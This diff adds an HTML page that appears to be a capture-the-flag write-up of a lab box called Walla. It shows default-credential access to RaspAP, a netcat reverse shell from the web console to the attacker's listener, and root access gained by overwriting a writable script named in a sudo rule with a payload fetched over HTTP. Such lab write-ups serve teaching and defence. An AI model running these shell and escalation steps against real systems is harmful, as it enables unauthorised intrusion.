@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Walla &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Walla</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">DefaultCreds</span><span class="tag">RaspAP</span><span class="tag">WebConsole</span><span class="tag">sudo</span><span class="tag">PythonHijack</span><span class="tag">FileWrite</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#default-credentials-on-raspap">Default Credentials on RaspAP</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#writable-python-script-in-sudo-rules">Writable Python Script in sudo Rules</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Walla is a Linux box running RaspAP, a web-based Wi-Fi management interface, protected by HTTP Basic Auth with vendor-default credentials. The application's built-in system console provides a shell escape as <code>www-data</code>. Privilege escalation abuses a sudo rule that lets <code>www-data</code> run a specific Python script, but the script file is writable, so replacing it with a one-liner spawns a root shell.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian
+23/tcp    open  telnet  Linux telnetd
+25/tcp    open  smtp    Postfix smtpd
+53/tcp    open  domain
+422/tcp   open  ssh     OpenSSH 7.9p1 Debian
+8091/tcp  open  http    lighttpd 1.4.53  (HTTP Basic Auth: RaspAP)
+42042/tcp open  ssh     OpenSSH 7.9p1 Debian
+</code></pre>
+<p>SSH is available on three ports (22, 422, 42042). Port 8091 serves an HTTP Basic Auth challenge identifying the realm as <strong>RaspAP</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="default-credentials-on-raspap">Default Credentials on RaspAP</h3>
+<p>The RaspAP documentation publishes the default credentials:</p>
+<pre><code>admin:‹redacted›
+</code></pre>
+<p>Those credentials worked against the Basic Auth prompt on port 8091, granting access to the RaspAP v2.5 management panel. A CVE exists for this version (CVE-2020-24572 RCE) but did not work against this box.</p>
+<blockquote>
+<p><strong>Why checking the docs beats running exploits first:</strong> appliance-style software ships with documented defaults so the installer can log in on first boot. A significant percentage of real deployments never change these. The check takes one HTTP request; an exploit takes minutes to set up and may fail on patched or differently-configured instances.</p>
+</blockquote>
+<p>The RaspAP panel includes a <strong>System &gt; Console</strong> page, a browser-based terminal running as <code>www-data</code>. Netcat with <code>-e</code> was available, so I used it to escape to a listener:</p>
+<pre><code class="language-sh"># in the web console
+nc 192.168.45.244 443 -e /bin/bash
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.97] 35628
+whoami
+www-data
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+www-data@walla:/var/www/html/includes$
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="writable-python-script-in-sudo-rules">Writable Python Script in sudo Rules</h3>
+<p><code>sudo -l</code> output:</p>
+<pre><code>User www-data may run the following commands on walla:
+    (ALL) NOPASSWD: /sbin/ifup
+    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
+    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
+</code></pre>
+<p>The rule pins the interpreter (<code>/usr/bin/python</code>) and the script path (<code>/home/walter/wifi_reset.py</code>), which looks secure. The file itself, however, was writable by <code>www-data</code>:</p>
+<pre><code class="language-sh">www-data@walla:/home/walter$ rm wifi_reset.py
+rm: remove write-protected regular file 'wifi_reset.py'? y
+</code></pre>
+<blockquote>
+<p><strong>Why pinning the script path isn't enough:</strong> sudo validates whether the command matches the allow-list, not whether the script's contents are safe. If the script file is writable by the calling user, the attacker controls what runs under sudo, the path restriction becomes meaningless. This is a common misconfiguration when admins grant sudo for a management script but leave it in a user's home directory.</p>
+</blockquote>
+<p>I replaced the file with a minimal Python payload:</p>
+<pre><code class="language-python">import os
+os.system('/bin/bash')
+</code></pre>
+<p>Served it over HTTP from Kali and downloaded it on target:</p>
+<pre><code class="language-sh">python3 -m http.server 80
+wget http://192.168.45.244/wifi_reset.py
+</code></pre>
+<p>Then ran it via the sudo rule:</p>
+<pre><code class="language-sh">www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
+root@walla:/home/walter# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@walla:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Default credentials are always step one on appliance-style web apps.</strong> <code>admin:‹redacted›</code> on RaspAP is in the public documentation.</li>
+<li><strong>Built-in web consoles are shells.</strong> RaspAP's System Console ran as <code>www-data</code> and supported <code>nc -e</code>, the web interface was the foothold.</li>
+<li><strong>sudo allow-lists that specify a script path still escalate if the script is writable.</strong> The file's permissions matter as much as the sudo rule's content.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
